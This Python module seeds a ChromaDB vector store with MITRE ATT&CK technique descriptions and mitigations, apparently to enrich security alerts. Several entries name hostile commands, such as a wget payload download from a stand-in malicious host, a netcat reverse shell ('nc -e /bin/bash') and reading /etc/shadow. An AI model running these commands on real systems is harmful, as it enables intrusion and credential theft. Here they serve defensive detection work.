"""Seeds ChromaDB with MITRE ATT&CK technique descriptions for RAG enrichment."""

import logging
import os

import chromadb
from sentence_transformers import SentenceTransformer

logger = logging.getLogger("rag-enricher.seeder")

COLLECTION_NAME = "mitre_techniques"
MODEL_NAME = "all-MiniLM-L6-v2"
CHROMA_DATA_PATH = os.getenv("CHROMA_DATA_PATH", "/chroma/data")

MITRE_TECHNIQUES = [
    {
        "id": "T1110",
        "name": "Brute Force",
        "tactic": "Credential Access",
        "description": (
            "Adversaries may use brute force techniques to gain access to accounts when passwords "
            "are unknown or when password hashes are obtained. Brute force attacks involve repeated "
            "login attempts using many passwords or passphrases. Sub-techniques include password "
            "guessing, password spraying, credential stuffing, and password cracking. "
            "SSH brute force is one of the most common forms, targeting remote login services."
        ),
        "mitigation": "Use multi-factor authentication, account lockout policies, and limit SSH access by IP.",
        "url": "https://attack.mitre.org/techniques/T1110/",
    },
    {
        "id": "T1078",
        "name": "Valid Accounts",
        "tactic": "Defense Evasion / Persistence / Privilege Escalation / Initial Access",
        "description": (
            "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining "
            "Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised "
            "credentials may be used to bypass access controls placed on various resources on systems. "
            "Successful login from an attacker IP after multiple failed attempts indicates valid account compromise."
        ),
        "mitigation": "Enforce MFA, monitor for off-hours logins, and audit privileged accounts.",
        "url": "https://attack.mitre.org/techniques/T1078/",
    },
    {
        "id": "T1059",
        "name": "Command and Scripting Interpreter",
        "tactic": "Execution",
        "description": (
            "Adversaries may abuse command and script interpreters to execute commands, scripts, or "
            "binaries. These interfaces and languages provide ways of interacting with computer systems "
            "and are a common feature across many different platforms. Most systems come with some "
            "built-in command-line interface and scripting capabilities, for example, macOS and Linux "
            "distributions include some flavor of Unix Shell while Windows installations include the "
            "Windows Command Shell and PowerShell. Dangerous commands include wget, curl piped to bash, "
            "netcat for reverse shells, and reading /etc/shadow."
        ),
        "mitigation": "Application whitelisting, restrict script execution policies, monitor for suspicious shell commands.",
        "url": "https://attack.mitre.org/techniques/T1059/",
    },
    {
        "id": "T1105",
        "name": "Ingress Tool Transfer",
        "tactic": "Command and Control",
        "description": (
            "Adversaries may transfer tools or other files from an external system into a compromised "
            "environment. Files may be copied from an external adversary-controlled system through the "
            "command and control channel to bring tools into the victim network or through alternate "
            "protocols with another tool such as FTP. Tools include wget and curl downloading payloads "
            "from remote C2 servers. wget http://malicious.example.com/payload.sh is a canonical example."
        ),
        "mitigation": "Network traffic filtering, block outbound connections to untrusted hosts, monitor for download tools.",
        "url": "https://attack.mitre.org/techniques/T1105/",
    },
    {
        "id": "T1071",
        "name": "Application Layer Protocol",
        "tactic": "Command and Control",
        "description": (
            "Adversaries may communicate using application layer protocols to avoid detection by "
            "blending in with existing traffic. Commands to the remote system, and often the results "
            "of those commands, will be embedded within the protocol traffic between the client and "
            "server. HTTP, HTTPS, DNS, and SMTP protocols are commonly abused. Curl and wget are "
            "commonly used to communicate with C2 servers over HTTP."
        ),
        "mitigation": "Network intrusion detection, SSL inspection, and application layer filtering.",
        "url": "https://attack.mitre.org/techniques/T1071/",
    },
    {
        "id": "T1021",
        "name": "Remote Services",
        "tactic": "Lateral Movement",
        "description": (
            "Adversaries may use valid accounts to log into a service specifically designed to accept "
            "remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions "
            "as the logged-on user. SSH is the most common remote service targeted. After compromising "
            "credentials via brute force, attackers commonly use remote services to move laterally."
        ),
        "mitigation": "Limit use of remote interactive login, use jump servers, monitor SSH connections.",
        "url": "https://attack.mitre.org/techniques/T1021/",
    },
    {
        "id": "T1003",
        "name": "OS Credential Dumping",
        "tactic": "Credential Access",
        "description": (
            "Adversaries may attempt to dump credentials to obtain account login and credential material, "
            "normally in the form of a hash or a clear text password, from the operating system and "
            "software. Credentials can then be used to perform Lateral Movement and access restricted "
            "information. Reading /etc/shadow is a canonical Linux credential dumping technique that "
            "reveals password hashes for all users."
        ),
        "mitigation": "Restrict /etc/shadow access, use PAM, monitor reads of sensitive credential files.",
        "url": "https://attack.mitre.org/techniques/T1003/",
    },
    {
        "id": "T1548",
        "name": "Abuse Elevation Control Mechanism",
        "tactic": "Privilege Escalation / Defense Evasion",
        "description": (
            "Adversaries may circumvent mechanisms designed to control elevated privilege to gain "
            "higher-level permissions. Most modern systems contain native elevation control mechanisms "
            "that are intended to limit privileges that a user can perform on a machine. chmod 777 "
            "on sensitive files or setting SUID bits are common privilege escalation techniques "
            "that weaken file permission controls."
        ),
        "mitigation": "Restrict sudo, monitor setuid operations, audit file permission changes.",
        "url": "https://attack.mitre.org/techniques/T1548/",
    },
    {
        "id": "T1136",
        "name": "Create Account",
        "tactic": "Persistence",
        "description": (
            "Adversaries may create an account to maintain access to victim systems. With a "
            "sufficient level of access, creating such accounts may be used to establish secondary "
            "credentialed access that do not require persistent remote access tools to be deployed "
            "on the system. Creating local accounts via useradd, adduser, or modifying /etc/passwd "
            "are common persistence mechanisms."
        ),
        "mitigation": "Monitor account creation events, restrict useradd to privileged users, audit /etc/passwd modifications.",
        "url": "https://attack.mitre.org/techniques/T1136/",
    },
    {
        "id": "T1046",
        "name": "Network Service Discovery",
        "tactic": "Discovery",
        "description": (
            "Adversaries may attempt to get a listing of services running on remote hosts and local "
            "network infrastructure devices, including those that may be vulnerable to remote exploitation "
            "through services. Scanning tools such as nmap are used. Port scanning precedes many attacks "
            "and is often seen before brute force attempts."
        ),
        "mitigation": "Monitor for network scanning traffic, use IDS to detect port scans.",
        "url": "https://attack.mitre.org/techniques/T1046/",
    },
    {
        "id": "T1190",
        "name": "Exploit Public-Facing Application",
        "tactic": "Initial Access",
        "description": (
            "Adversaries may attempt to take advantage of a weakness in an Internet-facing computer "
            "or program using software, data, or commands in order to cause unintended or unanticipated "
            "behavior. Weaknesses in these systems may be a bug, a glitch, or a design vulnerability. "
            "Web shells, SQL injection, and RCE exploits in public-facing services are common vectors."
        ),
        "mitigation": "Keep systems patched, use WAF, and regularly scan for vulnerabilities.",
        "url": "https://attack.mitre.org/techniques/T1190/",
    },
    {
        "id": "T1098",
        "name": "Account Manipulation",
        "tactic": "Persistence",
        "description": (
            "Adversaries may manipulate accounts to maintain access to victim systems. Account "
            "manipulation may consist of any action that preserves adversary access to a compromised "
            "account, such as modifying credentials or permission groups. Modifying SSH authorized_keys, "
            "adding to sudoers, or changing password hashes are common account manipulation techniques."
        ),
        "mitigation": "Monitor for unauthorized changes to /etc/sudoers, SSH authorized_keys, and user account attributes.",
        "url": "https://attack.mitre.org/techniques/T1098/",
    },
    {
        "id": "T1562",
        "name": "Impair Defenses",
        "tactic": "Defense Evasion",
        "description": (
            "Adversaries may maliciously modify components of a victim environment in order to hinder "
            "or disable defensive mechanisms. This not only involves attacking preventative defenses, "
            "such as firewalls and anti-virus, but also detection capabilities that defenders can use "
            "to identify malicious activity. Disabling firewalls, clearing logs, or stopping security "
            "services are common defense evasion techniques."
        ),
        "mitigation": "Protect security tools with access controls, use immutable logging, monitor for service disruptions.",
        "url": "https://attack.mitre.org/techniques/T1562/",
    },
    {
        "id": "T1053",
        "name": "Scheduled Task/Job",
        "tactic": "Execution / Persistence / Privilege Escalation",
        "description": (
            "Adversaries may abuse task scheduling functionality to facilitate initial or recurring "
            "execution of malicious code. Utilities exist within all major operating systems to schedule "
            "programs or scripts to be executed at a specified date and time. Cron jobs, at commands, "
            "and systemd timers are commonly abused for persistence after initial compromise."
        ),
        "mitigation": "Monitor crontab modifications, audit systemd unit files, and restrict task scheduling to privileged users.",
        "url": "https://attack.mitre.org/techniques/T1053/",
    },
    {
        "id": "T1055",
        "name": "Process Injection",
        "tactic": "Defense Evasion / Privilege Escalation",
        "description": (
            "Adversaries may inject code into processes in order to evade process-based defenses as "
            "well as possibly elevate privileges. Process injection is a method of executing arbitrary "
            "code in the address space of a separate live process. Running injected code may evade "
            "detection from security products since the execution is masked under a legitimate process."
        ),
        "mitigation": "Monitor for unusual process relationships and memory write patterns, use endpoint detection.",
        "url": "https://attack.mitre.org/techniques/T1055/",
    },
    {
        "id": "T1041",
        "name": "Exfiltration Over C2 Channel",
        "tactic": "Exfiltration",
        "description": (
            "Adversaries may steal data by exfiltrating it over an existing command and control channel. "
            "Stolen data is encoded into the normal communications channel using the same protocol as "
            "existing C2 communications. Netcat reverse shells (nc -e /bin/bash) provide a persistent "
            "command channel that can be used for data exfiltration."
        ),
        "mitigation": "Network traffic monitoring, DLP solutions, and egress filtering.",
        "url": "https://attack.mitre.org/techniques/T1041/",
    },
    {
        "id": "T1049",
        "name": "System Network Connections Discovery",
        "tactic": "Discovery",
        "description": (
            "Adversaries may attempt to get a listing of network connections to or from the compromised "
            "system they are currently accessing or from remote systems by querying for information "
            "over the network. Network connections discovered can reveal additional hosts, services, "
            "and adversary infrastructure. netstat and ss are common tools used."
        ),
        "mitigation": "Monitor use of network connection enumeration utilities, limit access to diagnostic commands.",
        "url": "https://attack.mitre.org/techniques/T1049/",
    },
    {
        "id": "T1070",
        "name": "Indicator Removal",
        "tactic": "Defense Evasion",
        "description": (
            "Adversaries may delete or modify artifacts generated within systems to remove evidence "
            "of their presence or hinder defenses. Various artifacts may be created by an adversary "
            "or exist as part of their activities on a system. Clearing bash history, deleting log "
            "files, and wiping /var/log are common anti-forensics techniques."
        ),
        "mitigation": "Centralize logging to prevent local deletion, use append-only log volumes, set HISTFILE to /dev/null detection.",
        "url": "https://attack.mitre.org/techniques/T1070/",
    },
    {
        "id": "T1082",
        "name": "System Information Discovery",
        "tactic": "Discovery",
        "description": (
            "An adversary may attempt to get detailed information about the operating system and "
            "hardware, including version, patches, hotfixes, service packs, and architecture. "
            "Adversaries may use the information from System Information Discovery to shape "
            "follow-on behaviors. Commands such as uname -a, cat /etc/os-release, and id are common."
        ),
        "mitigation": "Monitor for unusual system enumeration commands, especially following initial access.",
        "url": "https://attack.mitre.org/techniques/T1082/",
    },
    {
        "id": "T1068",
        "name": "Exploitation for Privilege Escalation",
        "tactic": "Privilege Escalation",
        "description": (
            "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. "
            "Exploitation of a software vulnerability occurs when an adversary takes advantage of a "
            "programming error in a program, service, or within the operating system software or kernel "
            "itself to execute adversary-controlled code. Local privilege escalation exploits target "
            "vulnerable SUID binaries, kernel vulnerabilities, and misconfigurations."
        ),
        "mitigation": "Keep systems patched, remove unnecessary SUID binaries, use least-privilege principles.",
        "url": "https://attack.mitre.org/techniques/T1068/",
    },
]


def get_chroma_client() -> chromadb.PersistentClient:
    return chromadb.PersistentClient(path=CHROMA_DATA_PATH)


def seed_chromadb() -> chromadb.Collection:
    client = get_chroma_client()
    model = SentenceTransformer(MODEL_NAME)
    logger.info("Embedding model loaded: %s", MODEL_NAME)

    collection = client.get_or_create_collection(
        name=COLLECTION_NAME,
        metadata={"hnsw:space": "cosine"},
    )

    existing = collection.count()
    if existing >= len(MITRE_TECHNIQUES):
        logger.info("ChromaDB already seeded (%d techniques), skipping", existing)
        return collection

    documents = [t["description"] for t in MITRE_TECHNIQUES]
    ids = [t["id"] for t in MITRE_TECHNIQUES]
    metadatas = [
        {
            "name": t["name"],
            "tactic": t["tactic"],
            "mitigation": t["mitigation"],
            "url": t["url"],
        }
        for t in MITRE_TECHNIQUES
    ]

    embeddings = model.encode(documents, show_progress_bar=False).tolist()

    collection.upsert(
        ids=ids,
        documents=documents,
        embeddings=embeddings,
        metadatas=metadatas,
    )
    logger.info("Seeded %d MITRE ATT&CK techniques into ChromaDB", len(MITRE_TECHNIQUES))
    return collection
